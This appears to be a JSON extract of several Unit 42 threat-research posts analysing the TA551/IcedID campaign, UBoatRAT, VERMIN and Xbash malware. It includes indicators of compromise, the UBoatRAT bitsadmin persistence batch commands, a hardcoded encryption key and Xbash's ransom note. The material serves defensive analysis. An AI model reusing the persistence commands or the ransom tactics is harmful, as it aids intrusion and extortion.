                "Figure 9 shows an email from this campaign dated April 2, 2019.",
                "It targeted an Italian-speaking recipient and pushed Ursnif malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 10 shows an email from this campaign dated Oct. 30, 2019.",
                "It targeted a German-speaking recipient and pushed Ursnif malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Note how the URL from the above example ends in .cab.",
                "This pattern was fairly consistent for URLs generated by macros from TA551 Word docs until late October 2020."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 11 shows an email from this campaign dated Dec. 17, 2019.",
                "It targeted a Japanese-speaking recipient and pushed Ursnif malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Note that Ursnif-infected hosts occasionally retrieve follow-up malware.",
                "For example, on Dec. 19, 2019, a Windows host infected with Ursnif by way of TA551 was also infected with IcedID and Valak as follow-up malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 12 shows an email from TA551 dated March 26, 2020.",
                "It targeted a German-speaking recipient and pushed ZLoader (Silent Night) malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 13 shows an email from this campaign dated April 28, 2020.",
                "It targeted an English-speaking recipient and pushed Valak malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "At this point, the document names had changed format.",
                "This is when we started seeing several different names for the extracted Word documents from each day of attack."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 14 shows an email from this campaign dated May 22, 2020.",
                "It targeted an English-speaking recipient and pushed Valak malware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The following files are associated with the above example:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "By this time, the password format for ZIP attachments changed to three digits followed by two letters, and the template style had also been updated."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We continued to see Valak pushed by TA551 through early July 2020.",
                "Of note, Valak is a malware downloader, and we frequently saw IcedID as follow-up malware from these infections."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, by mid-July 2020, TA551 started pushing IcedID directly from the Word document macros."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In recent weeks, TA551 has changed traffic patterns.",
                "For several months prior to Oct. 19, 2020, URLs generated by Word macros to retrieve installer binaries followed a noticeable pattern.",
                "This pattern includes:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since Oct. 20, 2020, these patterns have changed dramatically.",
                "Table 1 shows the changes starting in October."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1.",
                "URL patterns generated by macros from Word docs distributed by TA551."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "By Oct. 27, 2020, URLs generated by TA551 macros include English terms like update or share at the beginning of the HTTP GET request.",
                "These URLs end with a series of four to six lowercase English letters followed by a number as low as 1 to as high as 18.",
                "These URLs are not consistent in length, and they can be very short or very long."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since November 2020, we have also noticed minor changes in artifacts generated during IcedID infections, including those outside of the TA551 campaign."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For example, through early November 2020, IcedID DLLs created by installer DLLs were initially saved to the victims AppData\\Local\\Temp directory, and the file name started with a tilde (~) and ended with .dll as illustrated earlier in Figure 6.",
                "In November 2020, we started to see a change: the initial IcedID DLLs saved to the victims AppData\\Local directory with a file name ending in .dat as shown in Figure 15."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These changes may be an effort by malware developers to evade detection.",
                "At the very least, they might confuse someone conducting forensic analysis on an infected host."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Such changes are commonly seen in malware families as they evolve over time.",
                "We can expect to see more changes with IcedID malware and the TA551 campaign during the coming months."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Finally, the run method for installer DLLs retrieved by TA551 Word macros changed during November 2020:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "However, up-to-date information is necessary to ensure proper detection for a constantly-evolving campaign like TA551."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "TA551 has evolved since we last reviewed this threat actor deploying Valak malware in July 2020.",
                "We frequently saw IcedID as follow-up malware in previous months from Valak and Ursnif infections installed by TA551.",
                "This threat actor appears to have eliminated malware downloaders like Valak and Ursnif and is now deploying IcedID directly."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Although TA551 has settled on IcedID as its malware payload, we continue to see changes in traffic patterns and infection artifacts as this campaign evolves."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Organizations with adequate spam filtering, proper system administration and up-to-date Windows hosts have a much lower risk of infection.",
                "Palo Alto Networks Next-Generation Firewall customers are further protected from this threat with the Threat Prevention security subscription, which detects the malware.AutoFocuscustomers can track this activity using theTA551andIcedIDtags."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This GitHub repository currently has more than 50 text files containing various indicators associated with TA551 from mid-July 2020-November 2020.",
                "Each text file represents a specific day the campaign was active, and it contains SHA256 hashes, document names, associated URLs and other related data, some of which weve also shared through our Twitter handle @Unit42_Intel."
            ]
        }
    ],
    "47dd7057c2b4c971cad17cc6cdc9c3676294520c": [
        {
            "type": "paragraph",
            "content": [
                "Executive Summary\nPalo Alto Networks Unit 42 has identified attacks with a new custom Remote Access Trojan (RAT) called UBoatRAT.",
                "The initial version of the RAT, found in May of 2017, was simple HTTP backdoor that uses a public blog service in Hong Kong and a compromised web server in Japan for command and control.",
                "The developer soon added various new features to the code and released an updated version in June.",
                "The attacks with the latest variants we found in September have following characteristics."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Targets\nWe don't know the exact targets at the time of this writing.",
                "However, we theorize the targets are personnel or organizations related to Korea or the video games industry.",
                "One of the reasons for the hypothesis is the file names used by the attacker when delivering the malware.",
                "We see Korean-language game titles, Korea-based game company names and some words used in the video games business on the list.",
                "Another reason is that UBoatRAT performs malicious activities on the compromised machine only when joining an Active Directory Domain.",
                "Most home user systems are not part of a domain, and as such would not be impacted the same way.",
                "Below are some of the file names associated with UBoatRAT deliveries.",
                "The first three file names are written in Korean and only includes the general business topics.",
                "Last one contains unreleased game title, Project W and the Korean-based video game companys name."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delivery and Installation"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We observed multiple variants of UBoatRAT delivered from Google Drive.",
                "Not all of the links were active at the time of our analysis, but some (including the one below) were."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 Download from Google Drive"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The zip archive hosted on Google Drive contains the malicious executable file disguised as a folder or a Microsoft Excel spread sheet.",
                "The latest variants of the UBoatRAT released in late July or later masquerade as Microsoft Word document files."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Examples of UBoatRAT Masquerading"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When executed, the UBoatRAT checks for the following two conditions on the compromised machine."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the RAT detects virtual environment or fails to get the domain name, it displays following fake error message and quits."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 Fake error message"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Otherwise, UBoatRAT copies itself as C:\\programdata\\svchost.exe, creates C:\\programdata\\init.bat and executes the bat file.",
                "Then displays the following message and quits."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 Fake Error Message after installation"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Persistence with BITS",
                "UBoatRAT achieves persistence by using Microsoft Windows Background Intelligent Transfer Service(BITS).",
                "BITS is a service for transferring files between machines.",
                "Though the most famous application using the service is Windows Update, other applications or users can take advantage of the component.",
                "Bitsadmin.exe is a command-line tool user can create and monitor BITS jobs.",
                "The tool provides the option, /SetNotifyCmdLine which executes a program when the job finishes transferring data or is in error.",
                "UBoatRAT takes advantage of the option to ensure it stays running on a system, even after a reboot.",
                "The following is the contents of the init.bat.",
                "At the second line, the local file net.exe is specified to transfer to %temp%.log.",
                "After completing the copying the local file, BITS executes the UBoatRAT file configured with /SetNotifyCmdLine at the third line.",
                "bitsadmin /create d1f2g34\n bitsadmin /addfile",
                "d1f2g34 c:\\windows\\system32\\net.exe %temp%\\sys.log\n bitsadmin /SetNotifyCmdLine",
                "d1f2g34 \"c:\\programdata\\svchost.exe\" \"\"\n bitsadmin /Resume d1f2g34\n Del %0\nThe BITS job keeps executing the malware periodically even if the computer reboots.",
                "To remove the job from the queue, BITS needs to call Complete or Cancel explicitly.",
                "According to the article from Microsoft, the job remains 90 days by default if you don't call Complete or Cancel.\n\nC2 communication and backdoor commands"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The attacker behind the UBoatRAT hides the C2 address and the destination port in a file hosted on Github, using a URL like the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "https://raw.githubusercontent[.]com/r1ng/news/master/README.md\nThe malware accesses the URL and decodes the characters between the string [Rudeltaktik] and character !",
                "using BASE64.",
                "\"Rudeltaktik\" is the German military term which describes the strategy of the submarine warfare during the World War II.",
                "In the case below, the string can be decoded to 115.68.49[.]179:80.",
                "[Rudeltaktik]MTE1LjY4LjQ5LjE3OTo4MA==!",
                "UBoatRAT uses a custom command and control protocol to communicate with the attackers server.",
                "The malware places the string '488' (0x34, 0x38, 0x38 in HEX) at the top of the payload or instruction and encrypts the entire buffer with the static key 0x88 by using simple XOR cipher.",
                "Then the network payload always starts with 0xBC, 0xB0, 0xB0."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5 '488' marker"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 6 Encrypted '488' marker by static key"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We assume the attacker picks '488' from one of the German submarines because the author calls the RAT UBoat-Server."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 UBoat_Server in the malware"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After establishing a covert channel with C2, the threat waits following backdoor commands from the attacker."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Development of UBoatRAT\nAt the time of this writing, we have identified fourteen samples of UBoatRAT and one downloader associated with the attacks.",
                "Most of UBoatRAT samples retrieve C2 address from GitHub as described above.",
                "Only one sample released in May connected to public blog service in Hong Kong and compromised legitimate web server in Japan as C2.",
                "The sample uses regular HTTP protocol for communication.",
                "The account for the blog, 'elsa_kr' has existed since April 2016 and has no meaningful contents at this moment."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 8 Public Blog used as C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The author released a new version employing various new features in June.",
                "The early version of this new version obtains a C2 address from the repository 'uuu' owned by the GitHub account 'elsa999'.",
                "At the time of this writing, the 'uuu' repository has been deleted.",
                "It has since been replaced by three other repositories ('uj', 'hhh' and 'enm') all hosting an encoded combination of IP address and port in the account.",
                "According to the file history, the author has frequently been updating these files since July.",
                "After performing a quick analysis, we concluded these three repositories are for development and testing purpose for following reasons."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 9 GitHub account for testing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The 'elsa999' user also has the following three PowerShell scripts in their repositories.",
                "These scripts are written by other authors for penetration testing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThough the latest version of UBoatRAT was released in September, we have seen multiple updates in elsa999 accounts on GitHub in October.",
                "The author seems to be vigorously developing or testing the threat.",
                "We will continue to monitor this activity for updates.",
                "Palo Alto Networks customers are protected from this threat in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Indicators"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "UBoatRAT SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "bf7c6e911f14a1f8679c9b0c2b183d74d5accd559e17297adcd173d76755e271",
                "6bea49e4260f083ed6b73e100550ecd22300806071f4a6326e0544272a84526c cf832f32b8d27cf9911031910621c21bd3c20e71cc062716923304dacf4dadb7 7b32f401e2ad577e8398b2975ecb5c5ce68c5b07717b1e0d762f90a6fbd8add1 04873dbd63279228a0a4bb1184933b64adb880e874bd3d14078161d06e232c9b",
                "42d8a84cd49ff3afacf3d549fbab1fa80d5eda0c8625938b6d32e18004b0edac 7be6eaa3f9eb288de5606d02bc79e6c8e7fc63935894cd793bc1fab08c7f86c7 460328fe57110fc01837d80c0519fb99ea4a35ea5b890785d1e88c91bea9ade5 55dd22448e9340d13b439272a177565ace9f5cf69586f8be0443b6f9c81aa6e7 9db387138a1fdfa04127a4841cf024192e41e47491388e133c00325122b3ea82 e52d866e5b77e885e36398249f242f8ff1a224ecce065892dc200c57595bb494 eb92456bf3ab86bd71d74942bb955062550fa10248d67faeeeedd9ff4785f41e 452b1675437ef943988c48932787e2e4decfe8e4c3bed728f490d55b3d496875 66c2baa370125448ddf3053d59085b3d6ab78659efee9f152b310e61d2e7edb5"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Downloader SHA256"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f4c659238ffab95e87894d2c556f887774dce2431e8cb87f881df4e4d26253a3"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Web Access\nhttps://raw.githubusercontent[.]com/r1ng/news/master/README.md \nhttps://raw.githubusercontent[.]com/elsa999/uuu/master/README.md \nhttp://www.ak(masked)[.]jp/images/ http://elsakrblog.blogspot[.]hk/2017/03/test.html\nC2\n115.68.49[.]179:80\n115.68.49[.]179:443\n60.248.190[.]36:443\n115.68.52[.]66:443\n115.68.49[.]180:443\n122.147.187[.]173:443\n124.150.140[.]131:443\nFile\nC:\\programdata\\init.bat\nC:\\programdata\\svchost.exe"
            ]
        }
    ],
    "07c97225b3e1bae4fa451bcf916608496c85bd21": [
        {
            "type": "paragraph",
            "content": [
                "Summary\nPalo Alto Networks Unit 42 has discovered a new malware family written using the Microsoft .NET Framework which the authors call \"VERMIN\"; an ironic term for a RAT (Remote Access Tool).",
                "Cursory investigation into the malware showed the attackers not only had flair for malware naming, but also for choosing interesting targets for their malware: nearly all the targeting we were able to uncover related to activity in Ukraine.",
                "Pivoting further on the initial samples we discovered, and their infrastructure, revealed a modestly sized campaign going back to late 2015 using both Quasar RAT and VERMIN.",
                "This blog shows the links between the activity observed, a walkthrough of the analysis of the VERMIN malware, and IOCs for all activity discovered.",
                "It all began with a tweet\nOur initial interest was piqued through a tweet from a fellow researcher who had identified some malware with an interesting theme relating to the Ukrainian Ministry of Defense as a lure."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1 \u2013 The decoy document displayed to users when executing the initial malware sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The sample was an SFX exe which displayed a decoy document to users before continuing to execute the malware; the hash of the file is given below."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware was notable for its rare use of HTTP encapsulated SOAP, an XML based protocol used for exchanging structured information, for command and control (C2), which is something not often seen in malware samples.",
                "Using AutoFocus, we were quickly able to find similar samples, by pivoting on the artifacts the malware created during a sandbox run, resulting in 7 other samples as shown in Figure 2."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 \u2013 Pivoting in AutoFocus makes it easy to find similar malware samples."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Using the Maltego for AutoFocus transforms, we were then able to take the newly discovered samples and look at the C2 infrastructure in an attempt to see if we could link the samples together and in turn see if these C2s were contacted by malware.",
                "We quickly built up a picture of a campaign spanning just over 2 years with a modest C2 infrastructure:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 \u2013 Further analysis using AutoFocus & other data sources allows us to link up the activity discovered so far."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The malware samples we discovered fell largely into two buckets: Quasar Rat and VERMIN.",
                "Quasar RAT is an open-source malware family which has been used in several other attack campaigns including criminal and espionage motivated attacks.",
                "But a reasonable number of the samples were the new malware family, VERMIN.",
                "Looking at the samples in our cluster we could see the themes of the dropper files were similar to our first sample.",
                "Notably, most of the other files we discovered did not come bundled with a decoy document and instead were simply the malware and dropper compiled with icons matching popular document viewing tools, such as Microsoft Word.",
                "Names of some of the other dropper binaries observed are given below, with the original Ukrainian on the left and the translated English (via Google) on the right:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Given the interesting targeting themes and the discovery of a new malware family, we decided to take a peek at what VERMIN was capable of and document it here.",
                "Dissecting VERMIN\nFor this walkthrough, well be going through the analysis of the following sample:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Analyzing the malware dynamically quickly gave us a name for the malware, based on the PDB string present in the memory of the sample:\nZ:\\Projects\\Vermin\\TaskScheduler\\obj\\Release\\Licenser.pdb\nAs is the case with many of the samples from the threat actors behind VERMIN, our sample is packed initially with the popular .NET obfuscation tool ConfuserEx.",
                "Using a combination of tools, we were able to unpack and deobfuscate the malware.",
                "Following initial execution, the malware first checks if the installed input language in the system is equal to any of the following:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If none of the languages above is found the malware calls Application.",
                "Exit(), however despite its name, this API call doesnt actually successfully terminate the application, and instead the malware will continue to run.",
                "Its likely the author intended to terminate the application, in which case a call like System.Environment.",
                "Exit() would have been a better choice.",
                "The fact that this functionality does not work as intended suggests that if author tested the malware before deployment, they were likely to be doing so on systems where the language matches the list above, since otherwise they would notice that the function is not working as expected.",
                "After passing the installed language check the malware proceeds to decrypt an embedded resource using the following logic:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A script mirroring this routine can be found in appendix C.\nAfter decrypting the embedded resource, the malware passes several hardcoded arguments to the newly decrypted binary and performs a simple setup routine before continuing execution.",
                "The embedded resource contains all the main code for communications and functionality the RAT contains.",
                "First the malware attempts to decrypt all of the strings passed as parameters.",
                "If no arguments were supplied the malware attempts to read a configuration file from a pre-defined location expecting it to be base64-encoded and encrypted with 3-DES using a hardcoded key \"KJGJH&^$f564jHFZ\":\nC:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\AddIns\\settings.dat\nIf arguments were supplied, they are saved and encrypted to the same location as above.",
                "Parameters supplied are given below.",
                "Note that these are the actual variable names used by the malware author:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The decrypted resource is set to be run as a scheduled task every 30 minutes, indefinitely.",
                "After this, the malware is ready to start operations, and does so by collecting various information about the infected machine, examples of collected information includes but is not limited to:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the Anti-",
                "Virus (AV) query determines any AV is installed the malware does not install the keylogger.",
                "The keylogger is embedded as a resource named AdobePrintFr.",
                "This binary is only packed with Confuser-Ex and is not further obfuscated.",
                "The malware then sends its initial beacon using a SOAP envelope to establish a secure connection.",
                "The author uses the WSHttpBinding() API - which allows the author to use WS-Addressing and purposely sets the WSMessageEncoding.Mtom to encode the SOAP messages.",
                "The author also sets up for using Username authentication for communicating with its C2, presumably allowing the author easier control over the various infected hosts.",
                "A defanged exemplar request/response is given below:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "VERMIN collects all keystrokes and clipboard data and encrypts the data before storing it in the following folder:\n%appdata%\\Microsoft\\Proof\\Settings.{ED7BA470-8E54-465E-825C-99712043E01C}\\Profiles\\.\nEach file is saved with the following format: \"{0:dd-MM-yyyy}.txt\".",
                "The data is encrypted using the same method and 3-DES key, used to encrypt the configuration file.",
                "Vermin supports the following commands:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For most of these commands, the malware requires hands-on-keyboard style one-to-one interactions.",
                "Often remote access tools written in .NET borrow and steal code from other tools due to the plethora of code available through open source; however, it appears that whilst some small segments of code may have been lifted from other tools, this RAT is not a fork of a well-known malware family: its mostly original code.",
                "We have linked all the samples we have been able to identify to the same cluster of activity: this strongly suggests the VERMIN malware is used exclusively by this threat actor and this threat actor alone.",
                "Concluding thoughts\nWe were unable to definitively determine the aims of the attackers or the data stolen.",
                "However, given the limited number of samples, the targeting themes observed, and the hands-on-keyboard requirement for most of the malwares operations (except for keylogging), it seems likely that the malware is used in targeted attacks in Ukraine.",
                "Ukraine remains a ripe target for attacks, even gaining its own dedicated Wikipedia page for attacks observed in 2017.",
                "In addition to the high-profile attacks such as the Petya/NotPetya and BadRabbit, which have been widely reported, there are likely many smaller campaigns like the one described in this blog aimed to steal data to gain an information advantage for the attackers sponsors.",
                "Palo Alto Networks defends our customers against the samples discussed in this blog in the following ways:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "AutoFocus customers can track samples related to this blog via the following tags:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix A  C2 Addresses\nakamaicdn[.]ru\ncdnakamai[.]ru\nwww.akamaicdn[.]ru\nwww.akamainet066[.]info\nwww.akamainet023[.]info\nwww.akamainet021[.]info\nakamainet023[.]info\nakamainet022[.]info\nakamainet021[.]info\nwww.akamainet022[.]info\nakamainet066[.]info\nakamainet024[.]info\nwww.cdnakamai[.]ru\nnotifymail[.]ru\nwww.notifymail[.]ru\nmailukr[.]net\ntech-adobe.dyndns[.]biz\nwww.mailukr[.]net\n185.158.153[.]222\n94.158.47[.]228\n195.78.105[.]23\n94.158.46[.]251\n188.227.75[.]189\n212.116.121[.]46\n185.125.46[.]24\n5.200.53[.]181\n\nAppendix B  Malware Samples"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Appendix C  Python script to decode VERMIN resources"
            ]
        }
    ],
    "2d8ba48ac3f8f419b4e26f44c114a9ee52277c4e": [
        {
            "type": "paragraph",
            "content": [
                "Executive Summary:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Unit 42 researchers have found a new malware family that is targeting Linux and Microsoft Windows servers that we have named XBash.",
                "We can tie this malware to the Iron Group, a threat actor group known for ransomware attacks in the past."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Xbash has ransomware and coinmining capabilities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "It also has self-propagating capabilities (meaning it has worm-like characteristics similar to WannaCry or Petya/NotPetya).",
                "It also has capabilities not currently implemented that, when implemented, could enable it to spread very quickly within an organizations network (again, much like WannaCry or Petya/NotPetya)."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Xbash spreads by attacking weak passwords and unpatched vulnerabilities."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Xbash is data-destructive; destroying Linux-based databases as part of its ransomware capabilities.",
                "We can also find NO functionality within Xbash that would enable restoration after the ransom is paid."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "This means that, like NotPetya, Xbash is data destructive malware posing at ransomware."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Organizations can protect themselves against Xbash by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are protected against this threat as outlined at the end of this blog."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Below are some more specifics on Xbashs capabilities:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Research:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Recently Unit 42 used WildFire to identify a new malware family targeting Linux servers.",
                "After further investigation we realized its a combination of botnet and ransomware that developed by an active cybercrime group Iron (aka Rocke) in this year.",
                "We have named this new malware Xbash, based on the name of the malicious codes original main module."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Previously the Iron group developed and spread cryptocurrency miners or cryptocurrency transaction hijacking trojans mainly for Microsoft Windows and only a few for Linux.",
                "Instead, Xbash aimed on discovering unprotected services, deleting victims MySQL, PostgreSQL and MongoDB databases, and ransom for Bitcoins.",
                "Xbash uses three known vulnerabilities in Hadoop, Redis and ActiveMQ for self-propagation or infecting Windows system."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Other new technical characteristics in Xbash that are worth noting:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We have discovered four different versions of Xbash so far.",
                "Code and timestamp differences among these versions show that its still under active development.",
                "The botnet began to operate since as early as May 2018.",
                "Thus far, weve observed 48 incoming transactions to the Bitcoin wallet addresses used by the malware, which may indicate 48 victims of its ransom behavior."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In the rest of this blog, we will introduce more technical details of these behaviors, and introduce how Palo Alto Networks products prevent the threat."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Technical Details"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "From Python Code to Native Executable"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In a previous blog from 2016, Unit 42 revealed a Windows malware being developed by Python and being converted to PE executable by PyInstaller.",
                "All four versions of Xbash that we discovered also used this technique.",
                "Based on this, we believe the malware authors gain many benefits:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 1\u00a0 Detection Rate of Xbash as shown on VirusTotal"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Through manual reverse engineering, we were able to extract the main malicious Python modules from the Xbash executables and decompile them successfully.",
                "Therefore, in the later sections of this analysis, we show the Python source code."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "C2 Communication"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Xbash hard-coded a bunch of domain names as its C2 servers.",
                "It also fetches a webpage hosted on Pastebin (listed in the IOCs) to update the C2 domain list.",
                "Some of these C2 domains are reused from previous Windows coinminers attributed to Iron cybercrime group."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All C2 communications were based on HTTP protocol.",
                "We found three kinds of C2 traffic:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Three types of URIs were used to fetch scanning targets:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Through a still alive C2 domain, we were able to get 1,000 domains, 1,000 IP addresses, or a /22 CIDR per request, respectively as shown in Figure 2.",
                "We found that different requests will return different results, showing that the C2 servers were dynamic dispatching tasks to different bots.",
                "We randomly chose some domains and didnt find any specific region or industry targeted.",
                "And, the targeted domains are not in the Alexa top one million domains list."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2\u00a0 Xbash fetched domains from C2 server for further scanning"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Popular Linux botnets such as Mirai and Gafgyt usually only scan IP addresses.",
                "Xbash represents a next-stage evolution of Linux botnets by extending the targets to public websites by targeting domains as well as IP address.",
                "This also makes deploying a honeypot to observe Xbash challenging since honeypots are usually deployed with IP addresses only.",
                "While it may not be an intentional step, the inclusion of domain targeting has an anti-analysis benefit for the attackers."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Besides of fetching a list of scanning targets, Xbash will also request C2 server via URI /p to fetch a list of weak passwords for brute forcing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After Xbash has scanned a target and successfully found specific opening ports, weak credentials or exploitable, unpatched vulnerability, it will report the result to a random C2 server via HTTP POST to URI /c."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Service Probing and Brute Forcing"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If the scanning target is an IP address, Xbash will try to scan many TCP or UDP ports.",
                "Here are part of services theyre probing and the ports used:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For some services, such as VNC, Rsync, MySQL, MariaDB, Memcached, PostgreSQL, MongoDB, and phpMyAdmin, if a related port is open, it will use a built-in weak username/password dictionary and try to login into the service as shown in Figure 3.",
                "The dictionary also contains common or default passwords for services like Telnet, FTP, and Redis."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3\u00a0 Xbash tries to brute force services such as Rsync"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If Xbash successfully login into a service including MySQL, MongoDB, and PostgreSQL, it will delete almost all existing databases in the server (except for some databases that stored user login information), create a new database named PLEASE_READ_ME_XYZ, and leave a ransom message into table WARNING of the new database, as shown in Figure 4 and Figure 5."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Send 0.02 BTC to this address and contact this email with your website or your ip or db_name of your server to recover your database!",
                "Your DB is Backed up to our servers!If we not received your payment,we will leak your database"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "1jqpmcLygJdH8fN7BCk2cwwNBRWqMZqL1"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "backupsql@pm.me"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4\u00a0 Xbash create ransom message into MySQL database via phpMyAdmin"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 5\u00a0 New database, table and ransome message created by Xbash"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "If Xbash logged into a phpMyAdmin service, it will do exactly the same operations as above to those databases too, via sending HTTP requests to phpMyAdmin.",
                "This is because the phpMyAdmin service is usually managing some MySQL databases."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Its important to note that, the database name, table name, table schema, and the ransom message used by Xbash are almost identical with some incidents within multiple waves of ransom attacks to MySQL, MongoDB, ElasticSearch, Hadoop, CouchDB, Cassandra, Redis, AWS S3, etc. at 2016 and 2017, which have compromised over 56,685 servers in the globe by report.",
                "The only changes in Xbash are:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Thus far, we have observed three different bitcoin wallet addresses hard-coded in the Xbash samples.",
                "Since May 2018, there are 48 incoming transactions to these wallets with total income of about 0.964 bitcoins (about US$6,000 at the time of this writing).",
                "Figure 5 shows one of the wallets.",
                "Also, note that the funds are being withdrawn, showing us that the attackers are actively collecting their ransom."
            ]
        },
        {
            "type": "caption",
